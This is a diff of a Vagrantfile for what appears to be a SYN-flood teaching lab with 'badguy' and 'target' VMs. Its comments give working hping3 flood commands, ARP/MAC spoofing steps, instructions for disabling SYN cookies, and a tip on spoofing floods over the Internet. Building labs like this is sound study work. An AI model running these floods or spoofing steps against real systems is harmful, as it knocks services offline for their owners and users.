@@ -3,31 +3,35 @@
 
 Vagrant.configure(2) do |config|
 
-  # Scenario 1: Drop SYN-ACKs from victim and start flooding them with SYNs
-  # sudo iptables -I INPUT -s [victim IP] -j DROP
-  # sudo hping3 --flood -S -p 80 [victim IP]
-
-  # Scenario 2: Spoof MAC address of non-existent computer and flood victim with SYNs
-  # sudo watch -n10 "sudo arping -U -s 01:02:03:04:05:06 -S 172.16.0.7 172.16.0.6"
-  # sudo hping3 --flood -S -p 80 -a 172.16.0.7 172.16.0.6 
-
-  # Misc: Packet capture on target
-  # sudo tcpdump -i eth1
-  # NOTE: ARP cache lasts for 60 seconds
-  # cat /proc/sys/net/ipv4/neigh/default/gc_stale_time
-  # SYN floods over the Internet can be done by spoofing an IP that does not respond with RST packets 
-  #  (due to firewall most likely). These are useful for SYN floods. Use nmap to find hosts
-  #  that filter TCP: sudo nmap --scanflags synack 172.16.0.6.
-
   # Migitation: SYN cookies
   # Turned on by default. Turn off with:
   # sudo vi /etc/sysctl.conf
   # --> Set net.ipv4.tcp_syncookies = 0
   # sudo sysctl -p
 
+  # Scenario 1: Drop SYN-ACKs from victim and start flooding them with SYNs
+  # sudo iptables -I INPUT -s [victim IP] -j DROP
+  # sudo hping3 --flood -S -p 80 [victim IP]
+
+  # Scenario 2: Spoof MAC address of non-existent computer and flood victim with SYNs
+  # sudo watch -n10 "sudo arping -U -s 01:02:03:04:05:06 -S 172.16.0.28 172.16.0.27"
+  # sudo hping3 --flood -S -p 80 -a 172.16.0.28 172.16.0.27 
+
+  # Misc: Packet capture on target
+  # sudo tcpdump -i eth1
+
+  # View half-open TCP connections (e.g. SYN_RECV)
+  # netstat -at
+
+  # NOTE: ARP cache lasts for 60 seconds
+  # cat /proc/sys/net/ipv4/neigh/default/gc_stale_time
+  # SYN floods over the Internet can be done by spoofing an IP that does not respond with RST packets 
+  #  (due to firewall most likely). These are useful for SYN floods. Use nmap to find hosts
+  #  that filter TCP: sudo nmap --scanflags synack 172.16.0.28.
+
   config.vm.define "badguy" do |node|  
     node.vm.box = "gbarbieru/xenial"
-    node.vm.network "private_network", ip: "172.16.0.26", netmask: "29"
+    node.vm.network "private_network", ip: "172.16.0.26", netmask: "255.255.255.248"
     node.vm.hostname = "badguy"
 
     node.vm.provision "shell", inline: "sudo apt update; sudo apt install python hping3 arping -y"
@@ -35,7 +39,7 @@ Vagrant.configure(2) do |config|
 
   config.vm.define "target" do |node|
     node.vm.box = "gbarbieru/xenial"
-    node.vm.network "private_network", ip: "172.16.0.27", netmask: "29"
+    node.vm.network "private_network", ip: "172.16.0.27", netmask: "255.255.255.248"
     node.vm.hostname = "target"
 
     node.vm.provision "shell", inline: "sudo apt update; sudo apt install nginx tcpdump -y"
